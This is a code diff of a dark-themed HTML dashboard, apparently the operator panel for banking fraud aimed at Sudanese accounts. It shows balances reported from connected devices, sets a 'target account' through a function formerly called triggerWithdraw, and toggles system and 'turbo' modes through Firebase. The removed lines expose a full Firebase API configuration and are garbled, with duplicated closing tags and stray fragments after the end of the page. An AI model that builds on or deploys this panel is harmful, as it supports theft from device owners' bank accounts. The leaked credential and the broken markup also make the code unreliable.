@@ -14,19 +14,22 @@
         .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--primary); padding-bottom: 10px; }
         .label { color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
         .value { font-size: 28px; font-weight: bold; color: var(--success); font-family: monospace; margin: 10px 0; }
-        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; margin: 10px 0; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-primary { background: var(--primary); color: white; }
-        .btn-danger { background: var(--danger); color: white; margin-top: 10px; }
+        input[type="text"] { width: 100%; padding: 12px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; margin: 10px 0; box-sizing: border-box; }
         
-        /* Notification Pulse */
-        .alert-pulse { animation: pulse-red 1s infinite; border-color: var(--danger) !important; }
-        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(218, 54, 51, 0); } 100% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0); } }
+        /* Interactive Buttons Styling */
+        .status-btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid var(--border); font-weight: bold; cursor: pointer; transition: 0.3s; color: white; text-transform: uppercase; }
+        .btn-off { background: #21262d; color: #8b949e; }
+        .btn-on { background: var(--success); box-shadow: 0 0 10px rgba(35, 134, 54, 0.4); }
+        .btn-turbo { background: #f1e05a; color: #000; }
+        .btn-slow { background: #21262d; color: #8b949e; }
 
-        /* Device List Styling */
+        .btn-primary { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+
         .device-container { margin-top: 10px; max-height: 200px; overflow-y: auto; }
         .device-row { background: #0d1117; border: 1px solid var(--border); padding: 10px; border-radius: 6px; margin-bottom: 5px; font-size: 13px; display: flex; justify-content: space-between; align-items: center; }
         .device-id { color: var(--primary); font-family: monospace; }
+        .alert-pulse { animation: pulse-red 1s infinite; border-color: var(--danger) !important; }
+        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(218, 54, 51, 0); } 100% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0); } }
     </style>
 </head>
 <body>
@@ -41,126 +44,31 @@
         <div class="label">Detected Account Balance</div>
         <div id="cash-display" class="value">0.00 SDG</div>
         <div class="label">Last Activity</div>
-        <div id="last-time" style="font-size: 13px;">No data yet</div>
-        <audio id="alert-sound" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+        <div id="last-time" style="font-size: 13px;">Waiting...</div>
+    </div>
+
+    <div class="card">
+        <h3 style="margin-top:0">System Execution</h3>
+        <div class="label">System Connection</div>
+        <button id="system-btn" class="status-btn btn-off" onclick="toggleStatus()">غير متصل</button>
+        
+        <div class="label">Processing Speed</div>
+        <button id="turbo-btn" class="status-btn btn-slow" onclick="toggleTurbo()">حساب بطيء</button>
     </div>
 
     <div class="card">
         <h3 style="margin-top:0">Active Devices (activate)</h3>
         <div class="label">Total Devices: <span id="device-count">0</span></div>
         <div id="activate-list" class="device-container">
-            <div style="text-align:center; padding: 20px; color: #8b949e;">Scanning for devices...</div>
+            <div style="text-align:center; padding: 20px; color: #8b949e;">Scanning...</div>
         </div>
     </div>
 
     <div class="card">
-        <h3 style="margin-top:0">Control Panel</h3>
-        <div class="label">Target Account</div>
+        <h3 style="margin-top:0">Execution Control</h3>
+        <div class="label">Target Account Number</div>
         <input type="text" id="target-acc" placeholder="Enter Account Number">
-        <button class="btn-primary" onclick="triggerWithdraw()">Update Target</button>
-    </div>
-</div>
-
-<script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
-        authDomain: "sudancontrol-c5050.firebaseapp.com",
-        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
-        projectId: "sudancontrol-c5050",
-        appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
-    };
-
-    if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
-    }
-    const db = firebase.database();
-
-    // مراقب الأجهزة المحدث (يتعامل مع "الأطفال" ومع "النص البسيط")
-    db.ref('activate').on('value', (snap) => {
-        const listDiv = document.getElementById('activate-list');
-        const countDisplay = document.getElementById('device-count');
-        listDiv.innerHTML = "";
-        let count = 0;
-
-        if (snap.exists()) {
-            const data = snap.val();
-            
-            if (typeof data === 'object') {
-                // التعامل مع قائمة أطفال
-                Object.keys(data).forEach((key) => {
-                    count++;
-                    listDiv.innerHTML += `
-                        <div class="device-row">
-                            <span class="device-id">${key}</span>
-                            <span style="color: #238636;">Online</span>
-                        </div>`;
-                });
-            } else {
-                // التعامل مع نص بسيط (قيمة واحدة)
-                count = 1;
-                listDiv.innerHTML = `
-                    <div class="device-row">
-                        <span class="device-id">${data}</span>
-                        <span style="color: #238636;">Online</span>
-                    </div>`;
-            }
-        } else {
-            listDiv.innerHTML = '<div style="text-align:center; padding: 20px; color: #8b949e;">No devices connected</div>';
-        }
-        countDisplay.innerText = count;
-    });
-
-    // مراقب الرصيد
-    db.ref('Cash').on('value', (snap) => {
-        if(snap.exists()){
-            document.getElementById('cash-display').innerText = snap.val() + " SDG";
-            document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
-            document.getElementById('net-status').innerText = "System Online";
-            document.getElementById('net-status').style.color = "#238636";
-            triggerAlert();
-        }
-    });
-
-    function triggerWithdraw() {
-        const acc = document.getElementById('target-acc').value;
-        if(acc) {
-            db.ref('Account').set(acc);
-            alert("Target Account Updated");
-        }
-    }
-
-    function triggerAlert() {
-        const card = document.getElementById('balance-card');
-        card.classList.add('alert-pulse');
-        setTimeout(() => card.classList.remove('alert-pulse'), 3000);
-    }
-</script>
-</body>
-</html>
-        card.classList.add('alert-pulse');
-        document.getElementById('alert-sound').play();
-        setTimeout(() => card.classList.remove('alert-pulse'), 3000);
-    }
-</script>
-
-</body>
-</html>
-    <div class="card">
-        <h3 style="margin-top:0">System Overrides</h3>
-        <div class="switch-group">
-            <span>System Status (Active)</span>
-            <label class="switch">
-                <input type="checkbox" id="status-toggle" onchange="toggleControl('status', this.checked)">
-                <span class="slider"></span>
-            </label>
-        </div>
-        <div class="switch-group">
-            <span>Turbo Mode (Speed)</span>
-            <label class="switch">
-                <input type="checkbox" id="turbo-toggle" onchange="toggleControl('turbo', this.checked)">
-                <span class="slider"></span>
-            </label>
-        </div>
+        <button class="btn-primary" onclick="executeCommand()">Update & Send</button>
     </div>
 </div>
 
@@ -176,85 +84,71 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    let currentCash = "0.00";
+    let isSystemOn = false;
+    let isTurboOn = false;
+
+    // Toggle System Status
+    function toggleStatus() {
+        isSystemOn = !isSystemOn;
+        const btn = document.getElementById('system-btn');
+        if(isSystemOn) {
+            btn.innerText = "متصل / نشط";
+            btn.className = "status-btn btn-on";
+            db.ref('Settings/System').set("ON");
+        } else {
+            btn.innerText = "غير متصل";
+            btn.className = "status-btn btn-off";
+            db.ref('Settings/System').set("OFF");
+        }
+    }
+
+    // Toggle Turbo Speed
+    function toggleTurbo() {
+        isTurboOn = !isTurboOn;
+        const btn = document.getElementById('turbo-btn');
+        if(isTurboOn) {
+            btn.innerText = "حساب سريع (Turbo)";
+            btn.className = "status-btn btn-turbo";
+            db.ref('Settings/Speed').set("FAST");
+        } else {
+            btn.innerText = "حساب بطيء";
+            btn.className = "status-btn btn-slow";
+            db.ref('Settings/Speed').set("SLOW");
+        }
+    }
+
+    // Monitor Balance
     db.ref('Cash').on('value', (snap) => {
-        if(snap.exists()) {
-            const newCash = snap.val();
-            document.getElementById('cash-display').innerText = newCash + " SDG";
+        if(snap.exists()){
+            document.getElementById('cash-display').innerText = snap.val() + " SDG";
             document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
-            document.getElementById('net-status').innerText = "System Online - Data Received";
-            document.getElementById('net-status').style.color = "#238636";
-            if(newCash !== currentCash) { triggerAlert(); currentCash = newCash; }
+            document.getElementById('balance-card').classList.add('alert-pulse');
+            setTimeout(() => document.getElementById('balance-card').classList.remove('alert-pulse'), 2000);
         }
     });
 
+    // Monitor Devices
     db.ref('activate').on('value', (snap) => {
         const listDiv = document.getElementById('activate-list');
-        const countSpan = document.getElementById('device-count');
+        const countDisplay = document.getElementById('device-count');
         listDiv.innerHTML = "";
-        
-        if(snap.exists()) {
-            const data = snap.val();
-            let count = 0;
-            for(let key in data) {
+        let count = 0;
+        if (snap.exists()) {
+            const val = snap.val();
+            const keys = (typeof val === 'object') ? Object.keys(val) : [val];
+            keys.forEach(key => {
                 count++;
-                const isOnline = data[key].status === "true" || data[key].status === true;
-                const item = document.createElement('div');
-                item.className = 'device-row';
-                item.innerHTML = `
-                    <span>Device: <span class="device-id">${key}</span></span>
-                    <label class="switch">
-                        <input type="checkbox" ${isOnline ? 'checked' : ''} onchange="toggleDevice('${key}', this.checked)">
-                        <span class="slider"></span>
-                    </label>
-                `;
-                listDiv.appendChild(item);
-            }
-            countSpan.innerText = count;
-        } else {
-            listDiv.innerHTML = '<div style="text-align:center; padding: 20px; color: #8b949e;">No devices active</div>';
-            countSpan.innerText = "0";
+                listDiv.innerHTML += `<div class="device-row"><span class="device-id">${key}</span><span>Active</span></div>`;
+            });
         }
+        countDisplay.innerText = count;
+        document.getElementById('net-status').innerText = "Live Connection";
     });
 
-    db.ref('control').on('value', (snap) => {
-        const data = snap.val();
-        if(data) {
-            document.getElementById('status-toggle').checked = (data.status === "true");
-            document.getElementById('turbo-toggle').checked = (data.turbo === "true");
-        }
-    });
-
-    function toggleDevice(deviceId, isEnabled) {
-        const val = isEnabled ? "true" : "false";
-        db.ref('activate').child(deviceId).child('status').set(val);
-    }
-
-    function setTarget() {
-        const acc = document.getElementById('account-input').value;
-        if(!acc) return alert("Enter account number first!");
-        db.ref('Account').set(acc).then(() => alert("Target Set: " + acc));
-    }
-
-    function clearTarget() {
-        db.ref('Account').remove();
-        db.ref('Cash').set("0.00");
-        alert("System Reset Successfully");
-    }
-
-    function toggleControl(path, val) {
-        const strVal = val ? "true" : "false";
-        db.ref('control').child(path).set(strVal);
-    }
-
-    function triggerAlert() {
-        const card = document.getElementById('balance-card');
-        const sound = document.getElementById('alert-sound');
-        card.classList.add('alert-pulse');
-        if(sound) sound.play();
-        setTimeout(() => card.classList.remove('alert-pulse'), 5000);
+    function executeCommand() {
+        const acc = document.getElementById('target-acc').value;
+        if(acc) { db.ref('Account').set(acc).then(() => { alert("Updated"); }); }
     }
 </script>
-
 </body>
 </html>
